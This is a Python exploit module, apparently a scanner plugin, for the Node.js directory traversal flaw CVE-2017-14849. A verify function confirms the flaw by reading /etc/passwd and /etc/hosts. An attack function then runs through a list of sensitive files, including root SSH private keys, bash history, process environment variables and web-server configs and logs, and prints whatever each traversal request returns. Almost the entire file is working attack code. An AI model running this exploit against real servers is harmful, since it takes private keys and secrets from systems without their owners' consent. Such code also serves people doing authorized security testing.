import requests
import re
import urllib
from urllib import request
import time

def verify(url):
    relsult = {
        'name': 'Node.js 目录穿越漏洞(CVE-2017-14849)',
        'vulnerable': False,
        'attack': True,
    }

    try:
        if url[-1] == '/':
            url = url.rstrip('/')
        base_payload = "/static/../../../a/../../../../{0}"
        vurl1 = url + base_payload.format('etc/passwd')
        vurl2 = url + base_payload.format('etc/hosts')
        rep1 = request.urlopen(vurl1, timeout=3)
        rep2 = request.urlopen(vurl2, timeout=3)
        rep1_txt = rep1.read().decode('utf-8')
        rep2_txt = rep2.read().decode('utf-8')
        if re.search("root:x:", rep1_txt) and re.search("localhost", rep2_txt):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['payload'] = vurl1
            relsult['about'] = 'https://www.cnblogs.com/r00tuser/p/7805005.html'
            return relsult
        else:
            return relsult
    except:
        return relsult


def attack(url):
    if url[-1] == '/':
        url = url.rstrip('/')
    base_payload = "/static/../../../a/../../../..{0}"
    lists = [
        "/etc/passwd",
        "/etc/group",
        "/etc/hosts",
        "/etc/motd",
        "/etc/issue",
        "/etc/bashrc",
        "/etc/apache2/apache2.conf",
        "/etc/apache2/ports.conf",
        "/etc/apache2/sites-available/default",
        "/etc/httpd/conf/httpd.conf",
        "/etc/httpd/conf.d",
        "/etc/httpd/logs/access.log",
        "/etc/httpd/logs/access_log",
        "/etc/httpd/logs/error.log",
        "/etc/httpd/logs/error_log",
        "/etc/init.d/apache2",
        "/etc/mysql/my.cnf",
        "/etc/nginx.conf",
        "/opt/lampp/logs/access_log",
        "/opt/lampp/logs/error_log",
        "/opt/lamp/log/access_log",
        "/opt/lamp/logs/error_log",
        "/proc/self/environ",
        "/proc/version",
        "/proc/cmdline",
        "/proc/mounts",
        "/proc/config.gz",
        "/root/.bashrc",
        "/root/.bash_history",
        "/root/.ssh/authorized_keys",
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_rsa.keystore",
        "/root/.ssh/id_rsa.pub",
        "/root/.ssh/known_hosts",
    ]
    try:
        for file in lists:
            try:
                print('[*] 尝试读取文件: {0} ......'.format(file))
                vurl = url + base_payload.format(file)
                rep = request.urlopen(vurl, timeout=5)
                print(rep.read().decode('utf-8'))
            except:
                print('[-] {0} 读取失败'.format(file))
        return True
    except:
        return False

